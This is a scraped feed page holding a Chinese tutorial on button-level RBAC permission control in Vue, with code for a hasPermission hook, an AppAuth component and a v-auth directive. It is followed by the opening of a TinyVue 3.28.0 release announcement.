<p>在前两篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F17" target="_blank" title="https://github.com/bryqiu/Blog/issues/17" ref="nofollow noopener noreferrer">RBAC 权限系统实战（一）：页面级访问控制全解析</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F18" target="_blank" title="https://github.com/bryqiu/Blog/issues/18" ref="nofollow noopener noreferrer">RBAC 权限系统实战（二）：权限信息管理的设计</a> 中，我们在后台系统里已经实现了权限控制，但从权限细粒度的角度看，我们只做了“页面级”权限</p>
<p>在权限细粒度中，一般有这三种权限粒度：</p>
<ol>
<li><strong>页面/菜单级</strong>：用户是否能看到并访问该页面</li>
<li><strong>功能/操作级</strong>：进入页面后，是否能执行某个动作（比如按钮权限）</li>
<li><strong>数据级</strong>：可以操作、获取哪些数据、接口</li>
</ol>
<p>在某些业务场景下，我们希望用户能看到/进入页面，但不一定能操作所有功能。比如同一个列表页：A 只能“查看”，B 可以“新增/编辑”，C 还能“删除/导出”</p>
<p>因此本文主要实现操作级权限控制，也常称为“按钮级权限控制”</p>
<h2 data-id="heading-2">权限码设计</h2>
<p>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F17" target="_blank" title="https://github.com/bryqiu/Blog/issues/17" ref="nofollow noopener noreferrer">第一篇权限文章</a>中，我们在登录后，会请求用户信息接口，拿到用户的菜单路由数据再渲染访问</p>
<p>现在，还是基于这个接口返回的用户信息，我们要增加一个字段：<code>permissionCodes</code>，它是一个字符串数组，代表该用户拥有的操作权限</p>
<blockquote>
<p>我这里使用的是 ApiFox 来模拟的接口和数据，ApiFox 文档可以访问：<a href="https://link.juejin.cn?target=clean-admin.apifox.cn" target="_blank" title="clean-admin.apifox.cn" ref="nofollow noopener noreferrer">vue-clean-admin ApiFox 文档</a>，内有关于”获取用户信息接口“的文档介绍</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c15e3df1e7f4fe48bf55fd74779c052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=m3UDYF2WWLb0vZA7ipyw5LPfyxg%3D" alt="image.png" loading="lazy"/></p>
<p>你可以看到，返回的权限码列表遵循一定的格式来确保语义清晰，我们约定，权限码的格式如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/455f334154c24d069e0a846a96019ff1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=daW0Af05VG%2BKYoycivESYBQ5haI%3D" alt="image.png" loading="lazy"/></p>
<p>比如下面的菜单模块，关于新增、详情的权限码：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7a0651ef4e04079ad768e61348f4f9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=jdp3ukrt2whwnNycuH6XyGg7mEI%3D" alt="image.png" loading="lazy"/></p>
<p>当然，不是说不遵守这个格式就不行，但我推荐这种格式。可以让我们在代码里更清楚地理解权限码含义，也方便后续维护</p>
<p>还要考虑一种情况：某个角色不管系统有多少权限都可以访问，比如超级管理员 <code>superAdmin</code>，对于这样的角色，我们做点特殊处理，比如用通配符 <code>*</code> 表示全部权限（如 <code>*:*:*</code>）。这时无需再做权限筛选，直接放行即可</p>
<h2 data-id="heading-3">按钮级权限实战</h2>
<p>在操作级权限设计中，在 Vue 框架下，有三种实现按钮级权限的方式：<strong>组件式、自定义指令、函数式</strong></p>
<ol>
<li><strong>组件式</strong>：编写 Vue 组件，插槽内容由权限码属性决定是否渲染</li>
<li><strong>自定义指令</strong>：通过指令控制 DOM 来实现元素显隐</li>
<li><strong>函数式</strong>：在函数中写权限筛选逻辑，上面两种方式都会依赖它</li>
</ol>
<h3 data-id="heading-4">函数式</h3>
<p>函数式写法最常见，把权限判断封装成工具函数或 <code>hook</code> 都可以。先看一个实现：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/modules/user'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PermissionCode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'#/type'</span>;
<span class="hljs-keyword">import</span> { storeToRefs } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>;
<span class="hljs-keyword">import</span> { isEmpty } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useAuth</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>();
  <span class="hljs-keyword">const</span> { getPermissionCodes } = <span class="hljs-title function_">storeToRefs</span>(userStore);

  <span class="hljs-comment">//...</span>

  <span class="hljs-comment">/**
   * 判断是否有权限
   * <span class="hljs-doctag">@param</span> code 权限码，可以是单个权限码字符串，也可以是权限码数组
   * <span class="hljs-doctag">@returns</span> 是否有权限
   */</span>
  <span class="hljs-keyword">const</span> hasPermission = (<span class="hljs-attr">code</span>: <span class="hljs-title class_">PermissionCode</span>): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
    <span class="hljs-comment">// 如果是特殊通配符，直接放行</span>
    <span class="hljs-keyword">if</span> (getPermissionCodes.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'*:*:*'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// 空字符串、空数组情况，默认为无权限</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isEmpty</span>(code)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">const</span> codes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(code) ? code : [code];

    <span class="hljs-comment">// 只要满足其中一个权限码即可</span>
    <span class="hljs-keyword">return</span> codes.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> getPermissionCodes.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(c));
  };

  <span class="hljs-keyword">return</span> {
    hasPermission,
  };
};

</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">use-auth.ts</a> 找到实战代码</p>
</blockquote>
<p>这里我把逻辑写成一个 <code>hook</code>，重点关注 <code>hasPermission</code> 方法。它接收权限码参数 <code>code</code>，返回一个布尔值，表示是否有权限</p>
<p><code>getPermissionCodes</code> 表示当前用户拥有的权限码</p>
<p><code>code</code> 参数既可以是单个字符串，也可以是数组。因为用户可以同时拥有多个权限码（如 <code>user:add</code>、<code>user:edit</code>），所以类型定义如下：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * 权限码类型
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">PermissionCode</span>&lt;T = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">string</span>[]&gt; = T;

</code></pre>
<p>实际场景中，可配合 <code>v-if</code> 来控制元素显隐：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6222f0f25d08414c9eb61c158a51d084~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=Fi9bgDT%2FG9ZrNR1O0hARXd3PLY4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">组件式</h3>
<p>组件式很好理解：把“权限判断”封装成 Vue 组件，内部内容由权限码决定是否渲染。</p>
<p>这里用 <code>AppAuth</code> 组件示例：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { PermissionCode } from '@/types/common';
import { computed } from 'vue';
import { useAuth } from '@/hooks/useAuth';

defineOptions({
  name: 'AppAuth',
});

export interface AppAuthProps {
  /**
   * 权限码
   */
  codes: PermissionCode;
}

const props = withDefaults(defineProps&lt;AppAuthProps&gt;(), {
  codes: '',
});

const { hasPermission } = useAuth();

/**
 * 是否有权限
 */
const hasAuth = computed(() =&gt; {
  return hasPermission(props.codes);
});
&lt;/script&gt;

&lt;template&gt;
  &lt;slot v-if="hasAuth" /&gt;
  &lt;slot v-else name="no-auth" /&gt;
&lt;/template&gt;
</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">app-auth.vue</a> 找到代码实现</p>
</blockquote>
<p>在频繁使用的场景下，最好全局注册该组件：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AppAuth</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/AppAuth.vue'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

<span class="hljs-comment">// 全局注册</span>
app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'AppAuth'</span>, <span class="hljs-title class_">AppAuth</span>)

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)

</code></pre>
<p>全局注册组件时要补上 <code>TypeScript</code> 的类型提示，我在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Ftypings%2Fapp-components.d.ts%23L9" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/typings/app-components.d.ts#L9" ref="nofollow noopener noreferrer"><code>src/typings/app-components.d.ts</code></a> 中添加了类型声明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> {};

<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'vue'</span> {
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalComponents</span> {
    <span class="hljs-comment">//...</span>
    <span class="hljs-title class_">AppAuth</span>: (<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../components/common/app-auth/index'</span>))[<span class="hljs-string">'AppAuth'</span>];
  }
}

</code></pre>
<p>然后就可以直接使用 <code>AppAuth</code> 组件了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91a88cccac5f462a8993066e9114bcf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=L6twJfpSYJV8zeL5vqKugwLYoVU%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>当用户没有权限时，会渲染 <code>no-auth</code> 插槽的内容，可以在 <code>no-auth</code> 插槽中自定义展示内容。</p>
</blockquote>
<h3 data-id="heading-6">自定义指令</h3>
<p>自定义指令也是一种很方便的实现方式，通过操作 <code>DOM</code> 来实现元素显隐</p>
<p>通过 <code>app.directive</code> 方法来注册 <code>v-auth</code></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// directives/auth.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Directive</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">PermissionCode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types'</span>;
<span class="hljs-keyword">import</span> { useAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useAuth'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">AuthDirective</span> = <span class="hljs-title class_">Directive</span>&lt;<span class="hljs-title class_">HTMLElement</span>, <span class="hljs-title class_">PermissionCode</span>&gt;;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">authDirective</span>: <span class="hljs-title class_">AuthDirective</span> = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { hasPermission } = <span class="hljs-title function_">useAuth</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasPermission</span>(binding.<span class="hljs-property">value</span>)) {
      el.<span class="hljs-title function_">remove</span>();
    }
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { hasPermission } = <span class="hljs-title function_">useAuth</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasPermission</span>(binding.<span class="hljs-property">value</span>)) {
      el.<span class="hljs-title function_">remove</span>();
    }
  },
};

</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Fdirectives%2Fmodules%2Fauth.ts" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/directives/modules/auth.ts" ref="nofollow noopener noreferrer">directives/modules/auth.ts</a> 找到代码实现</p>
</blockquote>
<p>然后在 <code>main.ts</code> 中注册 <code>v-auth</code> 指令：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> { authDirective } <span class="hljs-keyword">from</span> <span class="hljs-string">'./directives/auth'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'auth'</span>, authDirective);
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>同样要补上全局指令的类型定义，在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Ftypings%2Fdirective.d.ts" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/typings/directive.d.ts" ref="nofollow noopener noreferrer"><code>src/typings/directive.d.ts</code></a> 中添加类型声明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">AuthDirective</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/directives/typing'</span>;

<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'vue'</span> {
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalDirectives</span> {
    <span class="hljs-attr">vAuth</span>: <span class="hljs-title class_">AuthDirective</span>;
  }
}

</code></pre>
<p>然后就可以使用 <code>v-auth</code> 指令来实现权限控制：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f37e57da0e647d68d018714913e87fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=oqRtAn1bdfKqvGBdDnrdUE%2Fi4cE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">菜单管理、角色管理</h2>
<p>在权限实战第二篇：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F18" target="_blank" title="https://github.com/bryqiu/Blog/issues/18" ref="nofollow noopener noreferrer">RBAC 权限系统实战（二）：权限信息管理的设计</a> 中，实现了菜单、角色管理的基本管理操作，比如菜单 CRUD、角色绑定权限等操作</p>
<p>从细粒度来看，我们现在多做了一层操作级权限，关于这两个模块，要进行一点小改动</p>
<p>在菜单管理中，新增、编辑菜单等操作中，新加一个”操作“的类型，以支持添加操作级权限信息</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cecf244332934f43873d1051edae7367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=1mknhEdpbHBMNRnbXgY3evYrtxo%3D" alt="image.png" loading="lazy"/></p>
<p>注意这里要填写的表单信息，是根据菜单类型来展示不同的字段，比如“操作”类型，需要填写权限码</p>
<p>然后，菜单列表的数据是这样的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/186c503a10754239b61b09a4c804f7e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=iAXUDeTsqpttnN83FYRoefEjpds%3D" alt="image.png" loading="lazy"/></p>
<p>在角色管理模块中，主要关注”分配权限“的操作，允许给角色分配操作级权限</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca354be394294ec2998b84e3cf5b8895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=vCZds%2BjUt06C6y42Zl6eJ3cSfM0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">了解更多</h2>
<p>系列专栏地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%3Ftab%3Dreadme-ov-file%23%25E9%2580%259A%25E4%25BF%2597%25E6%2598%2593%25E6%2587%2582%25E7%259A%2584%25E4%25B8%25AD%25E5%2590%258E%25E5%258F%25B0%25E7%25B3%25BB%25E7%25BB%259F%25E5%25BB%25BA%25E8%25AE%25BE%25E6%258C%2587%25E5%258D%2597%25E4%25B8%2593%25E6%25A0%258F" target="_blank" title="https://github.com/bryqiu/Blog?tab=readme-ov-file#%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E4%B8%AD%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E5%BB%BA%E8%AE%BE%E6%8C%87%E5%8D%97%E4%B8%93%E6%A0%8F" ref="nofollow noopener noreferrer">GitHub 博客</a> | <a href="https://juejin.cn/column/7437267529330901026" target="_blank" title="https://juejin.cn/column/7437267529330901026">掘金专栏</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fsegmentfault.com%2Fblog%2Fadmin_guide" target="_blank" title="https://segmentfault.com/blog/admin_guide" ref="nofollow noopener noreferrer">思否专栏</a></p>
<p>实战项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin" target="_blank" title="https://github.com/bryqiu/vue-clean-admin" ref="nofollow noopener noreferrer">vue-clean-admin</a></p>
<h2 data-id="heading-9">交流讨论</h2>
<p>文章如有错误或需要改进之处，欢迎指正。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TinyVue 3.28.0 正式发布：稳定性大幅提升！]]></title>    <link>https://juejin.cn/post/7602135278666022964</link>    <guid>https://juejin.cn/post/7602135278666022964</guid>    <pubDate>2026-02-03T06:17:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278666022964" data-draft-id="7602259669730230299" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TinyVue 3.28.0 正式发布：稳定性大幅提升！"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T06:17:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTiny社区"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TinyVue 3.28.0 正式发布：稳定性大幅提升！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTiny社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:21.000Z" title="Tue Feb 03 2026 06:17:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文由体验技术团队TinyVue项目组原创。</p>
<h2 data-id="heading-0">一、前言</h2>
<p>我们非常高兴地宣布，最近，TinyVue发布了 v3.28.0🎉,
这个版本带来了：</p>
<ul>
<li><strong>选择器组件家族全面重构</strong> - 统一架构，性能提升</li>
<li><strong>主题动画全局配置</strong>- 一键定制，随心所欲</li>
<li><strong>65+Bug 及优化修复</strong> - 稳定性大幅提升</li>
</ul>
<p>详细的 Release Notes 请参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Freleases%2Ftag%2Fv3.28.0" target="_blank" title="https://github.com/opentiny/tiny-vue/releases/tag/v3.28.0" ref="nofollow noopener noreferrer">github.com/opentiny/ti…</a></p>
<p>本次版本共有 11 位贡献者参与开发，其中 IKEYCY / neostfox 是新朋友，欢迎新朋友的加入👏，感谢新老朋友们对 TinyVue 的辛苦付出👏</p>
<ul>
<li>IKEYCY- 新增贡献者✨</li>
<li>neostfox- 新增贡献者✨</li>
<li>shenjunjian</li>
<li>kagol</li>
<li>zzcr</li>
<li>gimmyhehe</li>
<li>Davont</li>
<li>discreted66</li>
<li>wuyiping0628</li>
<li>James-9696</li>
<li>gausszhou</li>
</ul>
<p>同时，如果你在使用过程中遇到任何问题，或者有好的建议，欢迎：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Fissues" target="_blank" title="https://github.com/opentiny/tiny-vue/issues" ref="nofollow noopener noreferrer">提交 Issue</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Fdiscussions" target="_blank" title="https://github.com/opentiny/tiny-vue/discussions" ref="nofollow noopener noreferrer">加入讨论</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design%2Ftiny-vue" target="_blank" title="https://opentiny.design/tiny-vue" ref="nofollow noopener noreferrer">查看文档</a></li>
</ul>
<h2 data-id="heading-1">二、升级指南</h2>
